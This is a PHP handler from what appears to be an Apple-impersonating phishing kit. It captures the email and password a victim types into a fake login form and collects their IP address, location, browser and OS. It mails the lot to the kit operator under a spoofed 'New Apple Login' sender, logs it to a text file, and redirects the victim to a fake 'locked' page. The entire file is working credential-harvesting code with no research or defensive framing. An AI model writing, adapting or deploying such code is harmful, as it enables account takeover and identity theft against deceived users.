<?php 
	
	@error_reporting();
	session_start();
	include 'yours.php';

	if ( isset( $_POST['eemm'] ) && isset( $_POST['ppss'] ) ) {

		$_SESSION['email'] 	  = $_POST['eemm'];
		$_SESSION['password'] = $_POST['ppss'];

		$code = <<<EOT
============== [ New Apple Login ] ==============
Email 		: {$_SESSION['email']}
Password 	: {$_SESSION['password']}
	-------- IP Data --------
IP		: {$_SESSION['ip']}
Country		: {$_SESSION['ip_countryName']}
State		: {$_SESSION['ip_state']}
City		: {$_SESSION['ip_city']}
Zip 		: {$_SESSION['ip_zip']}
OS		: {$_SESSION['os']}
Browser		: {$_SESSION['browser']}
TimeZone	: {$_SESSION['ip_timezone']}
At 		: {$_SESSION['startAt']} GMT
============= [ ./New Apple Login ] =============
\r\n\r\n
EOT;

		$subject = "New Apple Login [". $_SESSION['email'] ."] From [". $_SESSION['ip_countryName'] ."]";
        $headers = "From: New APPLE Login <BIMO@2m.ma>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($yours,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: locked.php?&sessionid={$_SESSION['randString']}&sslmode=true");
        exit();
	} else {
		header("Location: index.php");
		exit();
	}
?>